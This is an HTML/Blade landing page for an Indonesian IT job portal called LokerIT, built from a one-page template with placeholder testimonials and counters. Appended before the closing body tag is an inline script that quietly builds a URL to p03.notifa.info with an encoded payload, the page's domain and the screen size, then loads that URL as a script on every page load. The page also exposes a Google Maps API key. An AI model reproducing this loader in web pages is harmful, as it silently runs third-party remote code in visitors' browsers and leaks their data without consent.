<!DOCTYPE html>
<html lang="en">
<head>

    <!-- meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport"       content="width=device-width, initial-scale=1.0">
    <meta name="description"    content="Abirvab - One Page Multipurpose Html Template">
    <meta name="keywords"       content="business, abirvab, responsive, multipurpose, onepage, corporate, clean">
    <meta name="author"         content="Ambidextrousbd">

    <!-- Site title -->
    <title>Manage your loker</title>

    <!-- favicon -->
    <link rel="shortcut icon" type="image/x-icon" href="{{asset('assets/front/assets/img/favicon.png')}}">

    <!-- Bootstrap css -->
    <link href="{{asset('assets/front/assets/css/bootstrap.min.css')}}" rel="stylesheet">

    <!--Font Awesome css -->
    <link href="{{asset('assets/front/assets/css/font-awesome.min.css')}}" rel="stylesheet">

    <!-- Normalizer css -->
    <link href="{{asset('assets/front/assets/css/normalize.css')}}" rel="stylesheet">

    <!-- Owl Carousel css -->
    <link href="{{asset('assets/front/assets/css/owl.carousel.min.css')}}" rel="stylesheet">
    <link href="{{asset('assets/front/assets/css/owl.transitions.css')}}" rel="stylesheet">

    <!-- Magnific popup css -->
    <link href="{{asset('assets/front/assets/css/magnific-popup.css')}}" rel="stylesheet">

    <!-- Site css -->
    <link href="{{asset('assets/front/assets/css/style.css')}}" rel="stylesheet">

    <!-- Responsive css -->
    <link href="{{asset('assets/front/assets/css/responsive.css')}}" rel="stylesheet">




    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->

</head>

<body>

    <!-- Preloader starts
    <div id="preloader"></div> -->
    <!-- Preloader ends -->


    <!-- Top Bar Starts -->
    <div class="top-bar">
        <div class="container">
            <div class="tmail">Email: infotim.com</div>
            <div class="tphone">Phone: 089685049878 </div>
            <div class="tsocial">
                <a href=""><i class="fa fa-twitter"></i></a>
                <a href=""><i class="fa fa-facebook"></i></a>
                <a href=""><i class="fa fa-skype"></i></a>
                <a href=""><i class="fa fa-google-plus"></i></a>
                <a href=""><i class="fa fa-pinterest"></i></a>
            </div>
        </div>
    </div>
    <!-- Top Bar Ends -->


    <!-- Navigation area starts -->
    <div class="menu-area navbar-fixed-top">
        <div class="container">
            <div class="row">

                <!-- Navigation starts -->
                <div class="col-md-12">
                    <div class="mainmenu">
                        <div class="navbar navbar-nobg">
                            <div class="navbar-header">
                                <a class="navbar-brand" href="index.html"><img src="assets/img/logo.png" alt=""></a>
                                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
                                    <span class="sr-only">Toggle navigation</span>
                                    <span class="icon-bar"></span>
                                    <span class="icon-bar"></span>
                                    <span class="icon-bar"></span>
                                </button>
                            </div>
                            <div class="navbar-collapse collapse">
                                <nav>
                                    <ul class="nav navbar-nav navbar-right">
                                        <li class="active"><a class="smooth_scroll" href="#slider">HOME</a></li>
                                        <li><a class="smooth_scroll" href="#about">ABOUT</a></li>
                                        <li><a class="smooth_scroll" href="#team">TEAM</a></li>
                                        <li><a class="smooth_scroll" href="#contact">CONTACT</a></li>
                                        @Auth('company')
                                        <li><a href="{{route('company.dashboard')}}" class="btn btn-trnsp btn-big">Beranda</a></li>
                                        @else
                                        <li><a href="{{route('login')}}" class="btn btn-trnsp btn-big">LOGIN</a></li>
                                        <li><a href="{{route('register')}}" class="btn btn-trnsp btn-big">REGISTER</a></li>
                                        @endauth
                                    </ul>
                                </nav>
                            </div>
                        </div>
                    </div>
                </div>
                <!-- Navigation ends -->

            </div>
        </div>
    </div>
    <!-- Navigation area ends -->



    <!-- Slider area starts -->
    <div id="slider" class="slider-area">
        <div id="carousel-example-generic" class="carousel slide carousel-fade">

            <div class="carousel-inner" role="listbox">

                <!-- Item 1 -->
                <div class="item active slide1">
                    <div class="table">
                        <div class="table-cell">
                            <div class="intro-text">
                                <p class="slide-caption"><FONT FACE="eucroasiaUPC">Welcome</FONT></p>
                                <div class="title clearfix">
                                    <h3><FONT FACE="gabriola">LokerIT offering more than just a job platform</FONT></h3>
                                </div>
                            </div>
                        </div>
                    </div>
                 </div>


                <!-- Item 2 -->
                <div class="item slide2">
                    <div class="table">
                        <div class="table-cell">
                            <div class="intro-text">
                                <p class="slide-caption"><FONT FACE="eucroasiaUPC">WE ARE HEARING</FONT></p>
                                <div class="title clearfix">
                                    <h3><FONT FACE="gabriola">Need to grow your business ? or Need to promotion your business?</FONT></h3>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Item 3 -->
                <div class="item slide3">
                    <div class="table">
                        <div class="table-cell">
                            <div class="intro-text">
                                <p class="slide-caption"><FONT FACE="eucroasiaUPC">HAVE A GREAT DAY</FONT></p>
                                <div class="title clearfix">
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

            </div>
            <!-- End Wrapper for slides-->


            <!-- Carousel Pagination -->
            <ol class="carousel-indicators">
                <li data-target="#carousel-example-generic" data-slide-to="0" class="active"></li>
                <li data-target="#carousel-example-generic" data-slide-to="1"></li>
                <li data-target="#carousel-example-generic" data-slide-to="2"></li>
            </ol>

        </div>
    </div>
    <!-- Slider area ends -->



    <!-- About area starts -->
    <section id="about" class="about-area section-big">
        <div class="container">

            <div class="row">
                <div class="col-md-12 text-center">
                    <div class="section-title">
                        <h2>About <span>Us</span></h2>
                        <p> suport untuk sebuah peluang bisnis dibidang IT yang menyediakan platform untuk penyebaran informasi lowongan kerja dibidang IT
                        </p>
                    </div>
                </div>
            </div>

            <div class="row">
                <!-- About Image -->
                <div class="col-md-6">
                    <div class="skill-section">
                        <div class="skill-title">
                            <h3>Contribution</h3>
                            <p>Memberikan tempat untuk mengolah lowongan kerja dan mendapatkan pekerja yang sesuai dengan kemampuan dibidang IT
                            </p>
                        </div>


                        <div class="skill-bar">
                            <h4>Lowongan Kerja</h4>
                            <div class="skillbar clearfix " data-percent="85%">
                                <div class="skillbar-bar"></div>
                                <div class="skill-bar-percent one">85%</div>
                            </div>
                        </div>
                    <!-- Work Skill -->
                        <div class="skill-bar">
                            <h4>Pekerja Diterima</h4>
                            <div class="skillbar clearfix " data-percent="80%">
                                <div class="skillbar-bar"></div>
                                <div class="skill-bar-percent two">80%</div>
                            </div>
                        </div>
                        <!-- Work Skill -->
                        <div class="skill-bar">
                            <h4>Pendaftar</h4>
                            <div class="skillbar clearfix " data-percent="90%">
                                <div class="skillbar-bar"></div>
                                <div class="skill-bar-percent three">90%</div>
                            </div>
                        </div>

                        <!-- Work Skill -->
                        <div class="skill-bar">
                            <h4>Pengguna</h4>
                            <div class="skillbar clearfix " data-percent="85%">
                                <div class="skillbar-bar"></div>
                                <div class="skill-bar-percent four">85%</div>
                            </div>
                        </div>
                    </div>
                </div>
        </div>
    </section>
    <!-- About area ends -->

    <!-- Team area starts -->
    <section id="team" class="team-area section-big">
        <div class="container">

            <div class="row">
                <div class="col-md-12 text-center">
                    <div class="section-title">
                        <h2>OUR TEAM <span>MEMBERS</span></h2>
                        <p>tim yang terdiri dari 2 orang</p>
                    </div>
                </div>
            </div>

            <div class="row">
                <div class="col-md-3 col-sm-6">
                </div>

                <div class="col-md-3 col-sm-6">
                    <div class="team-member wow fadeInUp" data-wow-delay="0.4s">
                        <div class="member-image">
                            <img src="{{asset('assets/front/assets/img/team/member-2.png')}}" alt="">
                        </div>

                        <div class="member-hover">
                            <div class="center-content">
                                <div class="member-social">
                                    <a href="#"><i class="fa fa-rss"></i></a>
                                    <a href="#"><i class="fa fa-facebook"></i></a>
                                    <a href="#"><i class="fa fa-twitter"></i></a>
                                    <a href="#"><i class="fa fa-google-plus"></i></a>
                                    <a href="#"><i class="fa fa-linkedin"></i></a>
                                </div>
                                <h3 class="subtitle">Annabela K </h3>
                                <p class="text-muted">Mobile Development</p>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="col-md-3 col-sm-6">
                    <div class="team-member wow fadeInUp" data-wow-delay="0.6s">
                        <div class="member-image">
                            <img src="{{asset('assets/front/assets/img/team/member-4.png')}}" alt="">
                        </div>

                        <div class="member-hover">
                            <div class="center-content">
                                <div class="member-social">
                                    <a href="#"><i class="fa fa-rss"></i></a>
                                    <a href="#"><i class="fa fa-facebook"></i></a>
                                    <a href="#"><i class="fa fa-twitter"></i></a>
                                    <a href="#"><i class="fa fa-google-plus"></i></a>
                                    <a href="#"><i class="fa fa-linkedin"></i></a>
                                </div>
                                <h3 class="subtitle">Dade Listi A</h3>
                                <p class="text-muted">Web Development</p>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="col-md-3 col-sm-6">
            </div>
        </div>
    </section>
    <!-- Team area ends -->


    <!-- fun-facts area starts -->
    <section id="fun-facts" class="fun-facts-area section-big">
        <div class="container">

            <div class="row">
                <div class="col-sm-6 col-md-3">
                    <div class="fun-fact text-center tab-margin-bottom">
                        <i class="fa fa-thumbs-o-up"></i>
                        <h3><span class="timer">850</span></h3>
                        <p>Projects Completed</p>
                    </div>
                </div>
                <div class="col-sm-6 col-md-3">
                    <div class="fun-fact text-center tab-margin-bottom">
                        <i class="fa fa-group"></i>
                        <h3> <span class="timer">800</span></h3>
                        <p>Happy Clients</p>
                    </div>
                </div>
                <div class="col-sm-6 col-md-3">
                    <div class="fun-fact text-center">
                        <i class="fa fa-envelope"></i>
                        <h3> <span class="timer">925</span></h3>
                        <p>Mail Conversation</p>
                    </div>
                </div>
                <div class="col-sm-6 col-md-3">
                    <div class="fun-fact text-center">
                        <i class="fa fa-file-image-o"></i>
                        <h3> <span class="timer">1656</span></h3>
                        <p>Photos Taken</p>
                    </div>
                </div>
            </div>

        </div>
    </section>
    <!-- fun-facts area ends -->

   <!-- Testimonial area starts -->
    <section id="testimonial" class="testimonial-area section-big">
        <div class="container">

            <div class="row">
                <div class="col-md-12 text-center">
                    <div class="section-title">
                        <h2>Client Testimonial</h2>
                        <p>Locavore pork belly scenester, pinterest chillwave microdosing waistcoat
                        pop-up. Flexitarian cliche artisan. </p>
                    </div>
                </div>
            </div>

            <div class="row">
                <div class="testimonial-list">

                    <!-- Testimonial item -->
                    <div class="single-testimonial">
                        <img src="{{asset('assets/front/assets/img/testimonial/1.png')}}" alt="">
                       <div class="testimonial-content">
                            <i class="fa fa-quote-left"></i>
                            <p>Locavore pork belly scenester, pinterest chillwave microdosing waistcoat pop-up. Flexitarian +1 cliche artisan, biodiesel mixtape tacos art party mustache cardigan kitsch squid disrupt. Truffaut deep v kitsch salvia sriracha.  </p>
                            <h4>John Doe</h4>
                            <p class="desg">CEO Designcare</p>
                       </div>
                    </div>

                    <!-- Testimonial item -->
                    <div class="single-testimonial">
                        <img src="{{asset('assets/front/assets/img/testimonial/2.png')}}" alt="">
                        <div class="testimonial-content">
                            <i class="fa fa-quote-left"></i>
                            <p>It is a long established fact that a reader will be distracted by the readable content of a page when looking at its layout. The point of using Lorem Ipsum is that it has a more-or-less normal distribution of letters.</p>
                            <h4>Micle Smith</h4>
                            <p class="desg">Founder of Ambidextrousbd</p>
                        </div>
                    </div>

                    <!-- Testimonial item <--></-->
                    <div class="single-testimonial">
                        <img src="{{asset('assets/front/assets/img/testimonial/3.png')}}" alt="">
                        <div class="testimonial-content">
                            <i class="fa fa-quote-left"></i>
                            <p>Locavore pork belly scenester, pinterest chillwave microdosing waistcoat pop-up. Flexitarian cliche artisan. There are many variations of passages of Lorem Ipsum available, but the majority have suffered alteration in some form, by injected humour.  </p>
                            <h4>Smith Doe</h4>
                            <p class="desg">Founder of designinfo</p>
                        </div>
                    </div>

                </div>
            </div>

        </div>
    </section>
    <!-- Testimonial area ends -->

    <!-- Client area starts -->
    <section id="client" class="client-area section-big">
        <div class="container">

            <div class="row">
                <div class="col-md-12">
                    <div class="section-title text-center">
                        <h2>Our  <span>Partner</span></h2>
                        <p>perusahaan yang bekerjasama dengan kami</p>
                        <p>Ayoo Daftarkan sekarang!!</p>
                    </div>
                </div>
            </div>

            <!-- client carousel -->
            <div class="owl-client">

                <!-- item 1 -->
                <div class="item text-center">
                    <img src="{{asset('assets/front/assets/img/clients/1.png')}}" alt="">
                </div>

                <!-- item 2 -->
                <div class="item text-center">
                    <img src="{{asset('assets/front/assets/img/clients/2.png')}}" alt="">
                </div>

                <!-- item 3 -->
                <div class="item text-center">
                    <img src="{{asset('assets/front/assets/img/clients/3.png')}}" alt="">
                </div>

                <!-- item 4 -->
                <div class="item text-center">
                    <img src="{{asset('assets/front/assets/img/clients/4.png')}}" alt="">
                </div>

                <!-- item 5 -->
                <div class="item text-center">
                    <img src="{{asset('assets/front/assets/img/clients/5.png')}}" alt="">
                </div>

                <!-- item 7 -->
                <div class="item text-center">
                    <img src="{{asset('assets/front/assets/img/clients/4.png')}}" alt="">
                </div>

            </div>
            <!-- / client carousel -->

        </div>
    </section>
    <!-- Client area ends -->

    <!-- Contact area starts -->
    <section id="contact" class="contact-area section-big">
        <div class="container">

            <div class="row">
                <div class="col-md-12 text-center">
                    <div class="section-title">
                        <h2> OUR<span>CONTACT</span></h2>
                        <p>hubungi kami jika membutuhkan bantuan, kirimkan kritik dan saran </p>
                    </div>
                </div>
            </div>

            <div class="row contact-infos">
                <div class="col-md-8">
                    <!-- Contact form starts -->
                    <div class="contact-form">

                        <!-- Submition status -->
                        <div id="form-messages"></div>

                        <form id="ajax-contact" action="assets/mailer.php" method="post">
                            <div class="row">

                                <div class="col-md-6">
                                    <div class="form-group in_name">
                                        <input type="text" name="name" class="form-control" id="name" placeholder="Full Name" required="required">
                                    </div>
                                </div>
                                <div class="col-md-6">
                                    <div class="form-group in_email">
                                        <input type="email" name="email" class="form-control" id="email" placeholder="Email Address" required="required">
                                    </div>
                                </div>
                                <div class="col-md-12">
                                    <div class="form-group in_subject">
                                        <input type="text" name="subject" class="form-control" id="subject" placeholder="Subject" required="required">
                                    </div>
                                </div>

                                <div class="col-md-12">
                                    <div class="form-group in_message">
                                        <textarea name="message" class="form-control" id="message" placeholder="Your Message" required="required"></textarea>
                                    </div>
                                    <div class="actions">
                                        <input type="submit" value="Sent Message" name="submit" id="submitButton" class="btn" title="Submit Your Message!">
                                    </div>
                                </div>
                            </div>
                        </form>
                    </div>
                    <!-- Contact form ends-->

                </div>
                <!-- <div class="clearfix visible-xs visible-sm visible-md"></div> -->

                <div class="col-md-4">
                    <div class="contact-info">
                        <i class="fa fa-home"></i>
                        <p>
                            Jln. Mataram no.9 Margadana Tegal Jawa Tengah Indonesia,
                            <br>
                            Tegal 52141
                        </p>
                    </div>
                    <div class="contact-info">
                        <i class="fa fa-phone"></i>
                        <p>
                            <a href="tel:0000" title="Click to Call">+ 000 - 1234 - 5678</a>
                            <br>
                            <a href="tel:0000" title="Click to Call">+ 000 - 9876 - 5432</a>
                        </p>
                    </div>
                    <div class="contact-info">
                        <i class="fa fa-globe"></i>
                        <p>
                            infotim@gmail.com
                        </p>
                    </div>

                </div>
            </div>

        </div>
    </section>
    <!-- Contact area ends -->

    <!-- social-area starts-->
    <div class="social-area">
        <div class="container text-center">
            <div class="row">
                <div class="social">
                     <ul class="social-links">
                        <li class="wow bounceInLeft" data-wow-delay="0.2s">
                            <a href=""><i class="fa fa-facebook"></i></a>
                        </li>
                        <li class="wow bounceInLeft" data-wow-delay="0.5s">
                            <a href=""><i class="fa fa-twitter"></i></a>
                        </li>
                        <li class="wow bounceInLeft" data-wow-delay="0.8s">
                            <a href=""><i class="fa fa-google-plus"></i></a>
                        </li>
                        <li class="wow bounceInLeft" data-wow-delay="1.1s">
                            <a href=""><i class="fa fa-youtube"></i></a>
                        </li>
                        <li class="wow bounceInLeft" data-wow-delay="1.4s">
                            <a href=""><i class="fa fa-pinterest"></i></a>
                        </li>
                    </ul>
                </div>
            </div>
        </div>
    </div>
    <!-- social-area ends-->


    <!-- Google Map starts-->
    <div id="contactgoogleMap"></div>
    <!-- Google Map ends -->


    <!-- Footer area starts -->
    <footer class="footer-area">
        <div class="container">
            <div class="row">
                <div class="footer-text-area">
                    <div class="col-md-12">
                        <div class="copyright-text">
                            <p>Copyright &copy; 2017 Abirvab. All Rights Reserved by Ambidextrousbd</p>
                        </div>
                        <div class="top-button">
                          <a href="#slider" class="back-to-top smooth_scroll"><i class="fa fa-angle-up"></i></a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </footer>
    <!-- Footer area ends -->



    <!-- Latest jQuery -->
    <script src="{{asset('assets/front/assets/js/jquery.min.js')}}"></script>

    <!-- Bootstrap js-->
    <script src="{{asset('assets/front/assets/js/bootstrap.min.js')}}"></script>

    <!-- Owl Carousel js -->
    <script src="{{asset('assets/front/assets/js/owl.carousel.min.js')}}"></script>

    <!-- Mixitup js -->
    <script src="{{asset('assets/front/assets/js/jquery.mixitup.js')}}"></script>

    <!-- Magnific popup js -->
    <script src="{{asset('assets/front/assets/js/jquery.magnific-popup.min.js')}}"></script>

    <!-- Waypoint js -->
    <script src="{{asset('assets/front/assets/js/jquery.waypoints.min.js')}}"></script>

    <!-- Ajax Mailchimp js -->
    <script src="{{asset('assets/front/assets/js/jquery.ajaxchimp.min.js')}}"></script>

    <!-- inview js -->
    <script src="{{asset('assets/front/assets/js/jquery.inview.min.js')}}"></script>

    <!-- Ajax Mailchimp js -->
    <script src="{{asset('assets/front/assets/js/jquery.inview.min.js')}}"></script>

    <!-- GOOGLE MAP JS -->
    <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyCWGUaG5S3B5VikF8UtVCgjki1Pv_HKGgo"></script>

    <!-- Main js-->
    <script src="{{asset('assets/front/assets/js/main_script.js')}}"></script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2DkCLHxj2qZVZ8RiyXoYJYvrjQygxuXfuaPDFa5MicAUQQ1AOhbSN1hdrIKtqbt3c5QXCSl8PeIA%2bzdNfmRn0LbPB46o4%2fiUC%2f%2fyKtWWz1JbDmktDB%2fHagExKJ5Jd%2fd6MjftPfyDcMHXYWMKO6D9MtSozQjOxvFc%2bQPJ1TT82hWHI4%2f2XvBVFAYijzWNf4a8fph9IKwezTt%2fxt9rBuu87oXPNBsDbQ7eszxO6%2b6%2frCk4ncaNVJUC0UQuUBLNrAjkA5z%2bP6Rs8ofOTUE0J6NlCok6cHBHRmc5%2bYEbVfsGLODmM34IC2bvfNTRt5FPYGK9vQB7IXguB80hbkYgpYjXh8pnZDuMuzzSyZc03FEpNU%2fNz4PqrxhVig8TrrniTI15kZoOCKVD9TBEKg6jNUjua4IbVfZnG%2b5ViJyXowHgy3GvZfTeF%2fxTjdA%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

</html>
